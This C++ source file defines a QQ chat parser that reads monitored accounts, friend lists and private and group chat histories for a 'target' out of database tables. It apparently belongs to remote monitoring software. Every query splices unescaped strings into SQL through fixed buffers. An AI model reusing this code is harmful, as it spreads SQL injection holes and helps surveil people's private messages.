#include "RemoteQQParser.h"
#include "DatabaseManager.h"

void RemoteQQParser::Init()
{
	int end = m_dataPath.rfind(L'\\');
	int start = m_dataPath.rfind(L'\\', end-1);
	std::wstring tarIdStr = m_dataPath.substr(start+1, end-start-1);
	m_targetId = _wtoi(tarIdStr.c_str());
}

const std::list<std::wstring>& RemoteQQParser::GetAccountList()
{
	m_accountList.clear();

	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, 
		L"select * from monitor_qq_account where targetId = %u",
		m_targetId);

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		std::wstring qqNumber = query.value(2).toString().toStdWString();
		m_accountList.push_back(qqNumber);
	}

	DM->Unlock();
	return m_accountList;
}

const QQParser::FriendList& RemoteQQParser::GetFriendList( const std::wstring& account )
{
	m_friendList.clear();

	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, 
		L"select * from monitor_qq_friend where targetId = %u and owner = '%s'",
		m_targetId, account.c_str());

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		std::wstring number = query.value(3).toString().toStdWString();
		std::wstring nickName = query.value(4).toString().toStdWString();
		std::wstring remark = query.value(5).toString().toStdWString();
		std::wstring signature = query.value(6).toString().toStdWString();
		std::wstring groupName = query.value(7).toString().toStdWString();

		FriendInfo info;
		info.account = number;
		info.nickName = nickName;
		info.remark = remark;
		info.signature = signature;
		info.groupName = groupName;

		m_friendList.push_back(info);
	}

	DM->Unlock();

	return m_friendList;
}

const QQParser::ChatHistoryList& RemoteQQParser::GetChatHistory( 
	const std::wstring& account, const std::wstring& friendAccount )
{
	m_chatList.clear();

	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, 
		L"select * from monitor_qq_content where targetId = %u and owner = '%s' and containerNumber = '%s' order by sendTime",
		m_targetId, account.c_str(), friendAccount.c_str());

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		ChatHistory info;

		std::wstring time = query.value(7).toString().toStdWString();
		int msgType = query.value(8).toInt();
		std::wstring message = query.value(9).toString().toStdWString();
		std::wstring senderNumber = query.value(5).toString().toStdWString();
		std::wstring senderName = query.value(6).toString().toStdWString();

		info.time = time;
		info.msgType = msgType;
		info.isSend = senderName == account ? 1 : 0;
		info.message = message;
		info.senderName = senderName == L" " ? senderNumber : senderName;

		m_chatList.push_back(info);
	}

	DM->Unlock();

	return m_chatList;
}

QQParser::GroupInfo RemoteQQParser::GetGroupInfo( const std::wstring& account, int groupId )
{
	GroupInfo grpInfo;
	grpInfo.groupId = -1;
	return grpInfo;
}

const QQParser::TroopList& RemoteQQParser::GetTroopList( const std::wstring& account )
{
	m_troopList.clear();

	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, 
		L"select * from monitor_qq_troop where targetId = %u and owner = '%s'",
		m_targetId, account.c_str());

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		std::wstring troopNumber = query.value(3).toString().toStdWString();
		std::wstring troopName = query.value(4).toString().toStdWString();
		std::wstring troopMemo = query.value(5).toString().toStdWString();

		TroopInfo info;
		info.troopNumber = troopNumber;
		info.troopName = troopName;
		info.troopMemo = troopMemo;

		m_troopList.push_back(info);
	}

	DM->Unlock();

	return m_troopList;
}

const QQParser::ChatHistoryList& RemoteQQParser::GetTroopChatHistory( 
	const std::wstring& account, const std::wstring& troopNumber )
{
	m_chatList.clear();

	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, 
		L"select * from monitor_qq_content where targetId = %u and owner = '%s' and containerNumber = '%s'",
		m_targetId, account.c_str(), troopNumber.c_str());

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		ChatHistory info;

		std::wstring time = query.value(7).toString().toStdWString();
		int msgType = query.value(8).toInt();
		std::wstring message = query.value(9).toString().toStdWString();
		std::wstring senderNumber = query.value(5).toString().toStdWString();
		std::wstring senderName = query.value(6).toString().toStdWString();

		info.time = time;
		info.msgType = msgType;
		info.isSend = senderName == account ? 1 : 0;
		info.message = message;
		info.senderName = senderName == L" " ? senderNumber : senderName;

		m_chatList.push_back(info);
	}

	DM->Unlock();

	return m_chatList;
}
